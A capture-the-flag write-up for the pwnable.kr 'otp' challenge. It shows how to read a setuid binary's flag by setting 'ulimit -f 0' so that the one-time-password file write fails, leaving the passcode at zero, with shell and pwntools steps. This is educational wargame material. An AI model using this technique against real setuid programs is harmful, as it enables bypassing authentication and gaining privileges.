## Description
otp - 100 pt [writeup]

> I made a skeleton interface for one time password authentication system.
> I guess there are no mistakes.
> could you take a look at it?
>
> hint : not a race condition. do not bruteforce.
>
> ssh otp@pwnable.kr -p2222 (pw:guest)

## Solution
Let's run some basic checks that hopefully will be helpful later.
```shell
$ file otp
otp: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=f851771b439725c55be4ed4b0e102c2a39f4c196, not stripped

$ checksec otp
[*] './otp'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Something interesting I noticed in the code:
```c
    unsigned long long passcode=0;
    ...
	if(strtoul(argv[1], 0, 16) == passcode){
		printf("Congratz!\n");
		system("/bin/cat flag");
	}
    ...
```
passcode is of type unsigned long long, when the return value of `strtoul()` is of type unsigned long.
But after checking on the server, both of size 8. So it probably doesn't matter here.

Notice one thing, the program doesn't check wheter `passcode` was read from the file succefully or not.
Also, it is set first to be zero.
So if we can prevent the binary from writing to files before its execution, `passcode` will stay zero!

Lets look at the `ulimit` command:
```shell
# from https://ss64.com/bash/ulimit.html
ulimit
User limits - limit the use of system-wide resources.

Syntax
      ulimit [-HS] -a
      ulimit [-HS] [-bcdefiklmnpqrstuvxPRT] [limit]
Key
   -S   Set a soft limit for the given resource.
   -H   Set a hard limit for the given resource.

   -a   All current limits are reported.
   -b   The maximum socket buffer size.
   -c   The maximum size of core files created. 
   -d   The maximum size of a process's data segment.
   -e   The maximum scheduling priority ("nice") 
   -f   The maximum size of files created by the shell(default option).
   ...
```

Notice the `-f` option. If we limit the maximum size of files created by the shell to be 0, then the program won't be able to write to the otp file.
Which will make `passcode` stay 0. 

So let's try it, connect via ssh and run the following:
```shell
$ ulimit -f 0
$ $ ./otp ''
File size limit exceeded (core dumped)
```
So.. it didn't work. Why? Let's run it again with GDB:
```shell
$ gdb otp
...
(gdb) r ''
Starting program: /home/otp/otp ''

Program received signal SIGXFSZ, File size limit exceeded.
0x00007f001d3a83c0 in __write_nocancel () at ../sysdeps/unix/syscall-template.S:84
84      ../sysdeps/unix/syscall-template.S: No such file or directory.
```
So as we expected, the program tried to write to the file, but failed because of the file size limit.
But it also threw SIGXFSZ which stopped the execution of the program.\
So how can we prevent this from happening?\
After some trial and error, I found out that if we run `otp` as a subprocess, it ignores the SIGXFSZ signal.

```shell
$ ulimit -f 0
$ python2
Python 2.7.12 (default, Mar  1 2021, 11:38:31) 
>>> from pwn import *
>>> with process(["/bin/bash", "-c", "/home/otp/otp ''"]) as p:
...     print p.recvline()
...     print p.recvline()
...     print p.recvline()
```
and we get the flag!

## Setup
```shell
ssh otp@pwnable.kr -p2222 (pw:guest)
```
